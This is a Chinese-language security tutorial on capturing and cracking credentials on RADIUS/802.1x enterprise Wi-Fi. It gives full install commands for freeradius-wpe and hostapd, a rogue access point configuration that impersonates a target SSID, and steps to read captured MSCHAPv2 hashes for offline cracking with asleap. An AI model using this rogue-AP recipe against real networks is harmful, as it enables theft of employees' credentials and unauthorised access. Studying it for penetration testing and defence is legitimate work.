# 破解使用radius实现802.1x认证的企业无线网络

0x01前言概述
========

* * *

针对开放式(没有密码)无线网络的企业攻击，我个人感觉比较经典的攻击方式有2种，一种是`eviltwin`，一种是`karma`。`karma`应该是`eviltwin`攻击手法的升级版，攻击者只需要简单的监听客户端发的ssid探测和响应包就可以实现中间人了，受害者很少会有察觉。而且坊间曾有一个错误的认识，认为隐藏的ssid是不受`karma`影响的。但是实际情况是，客户端如果曾经连接过隐藏的ssid，也会广播这些网络的探测包。尽管`karma`这种攻击方式已经有10多年的历史了，但是在MAC OSX，ubuntu，老版本的andorid系统上依然有效。win7的默认配置居然是防护`karma`攻击的。

对加密的无线网络，针对个人网络，很多是使用**wpa2-psk**预共享密钥的方法来限制访问。而公司的无线网络有使用**wpa2**企业认证的，也有使用**radius**服务提供独立的用户名和密码来实现802.1x标准认证的。

0x02 实现过程
=========

* * *

我这里是的攻击是使用`hostapd`扮演一个无线访问点，然后通过打补丁的`freeraidus wpe`来捕捉密码hash，最后用`asleep`来离线破解密码，来对抗相对安全的使用**radius**服务器提供独立的用户名和密码实现的802.1x认证的企业无线网络环境。

所需设备：

```
TP-LINK TL-WN821N 
Kali 1.1.0

```

首先安装`freeradius-wpe`,既可以使用`dpkg`直接安装`freeradius-server-wpe_2.1.12-1_i386.deb`,也可以通过源码编译来安装，通过deb包安装方法的命令如下：

```
wget https://github.com/brad-anton/freeradius-wpe/raw/master/freeradius-server-wpe_2.1.12-1_i386.deb
dpkg --install freeradius-server-wpe_2.1.12-1_i386.deb
ldconfig
cd /usr/local/etc/raddb/certs
./bootstrap && ldconfig

```

![the progress pictures](http://drops.javaweb.org/uploads/images/1fbeffcef3196d3bcc5846011b60faa79621cf6b.jpg)

通过源码安装的步骤如下：

```
git clone https://github.com/brad-anton/freeradius-wpe.git
wget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-2.1.12.tar.bz2  
tar jxvf freeradius-server-2.1.12.tar.bz2
patch -p1 < ../freeradius-wpe.patch   
./configure
make install

```

![the progress pictures](http://drops.javaweb.org/uploads/images/2194ce0d988f6d0e571512ef5e33c905f77ffb7d.jpg)

然后执行`radiusd -X`开启`debug`模式验证是否安装成功，如果运行此命令的时候提示

```
Failed binding to /usr/local/var/run/radiusd/radiusd.sock: No such file or directory

```

则需要建立相应的目录

```
root@HackRF:/usr/local/etc/raddb/certs# mkdir -p /usr/local/var/run/radiusd/

```

接下来安装`hostapd`，命令如下：

```
wget http://hostap.epitest.fi/releases/hostapd-2.0.tar.gz
tar zxvf hostapd-2.0.tar.gz
cd hostapd-2.0/hostapd/
cp defconfig .config
make

```

![the progress pictures](http://drops.javaweb.org/uploads/images/9f29566a13610f15f2bf1c77e08a71cb49f71e65.jpg)

如果安装的时候提示：

```
../src/drivers/driver_nl80211.c:19:31: fatal error: netlink/genl/genl.h: No such file or directory
compilation terminated.
make: *** [../src/drivers/driver_nl80211.o] Error 1

```

则需要安装`libnl`开发包，命令如下：

```
root@HackRF:/hostapd-2.0/hostapd# sudo apt-get install libnl1 libnl-dev

```

然后编辑`hostapd-wpe.conf`文件，如下

```
interface=wlan0
driver=nl80211
ssid=corp-lobby
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=1
wpa_pairwise=CCMP
rsn_pairwise=CCMP

```

实际操作需要修改的地方只有ssid项，如果你的目标企业无线网络的ssid叫corp-lobby，则修改`ssid=corp-lobby`,运行`hostapd -dd hostapd-wpe.conf`开启伪造的无线热点

这时候如果有企业员工在你附近，他的手机会自动连接你的伪造的无线热点，你就可以通过

```
tail -f /usr/local/var/log/radius/freeradius-server-wpe.log

```

看到抓到的用户名和MSCHAPv2的响应hash和挑战hash。

![the progress pictures](http://drops.javaweb.org/uploads/images/9fdee59e96da1cb5192655189de8555b65bfcbd1.jpg)

有了challenge和response，就可以使用`asleep`工具来基于字典的暴力破解，命令如下

![the progress pictures](http://drops.javaweb.org/uploads/images/d4d48bec5ada7a867d354fb7ce0c6c4de2b94aa6.jpg)

使用**radius**实现802.1x认证的企业无线网络相对来说还是比较安全的，如果每个用户的密码足够复杂的话。后续的国外研究者也对这种攻击增加了针对客户端和路由设备的心跳漏洞的工具，集成的项目叫**cupid**,有兴趣的可以参考[http://www.sysvalue.com/en/heartbleed-cupid-wireless/](http://www.sysvalue.com/en/heartbleed-cupid-wireless/)

0x03 参考文章
=========

* * *

[http://phreaklets.blogspot.sg/2013/06/cracking-wireless-networks-protected.html](http://phreaklets.blogspot.sg/2013/06/cracking-wireless-networks-protected.html)[https://insights.sei.cmu.edu/cert/2015/08/instant-karma-might-still-get-you.html](https://insights.sei.cmu.edu/cert/2015/08/instant-karma-might-still-get-you.html)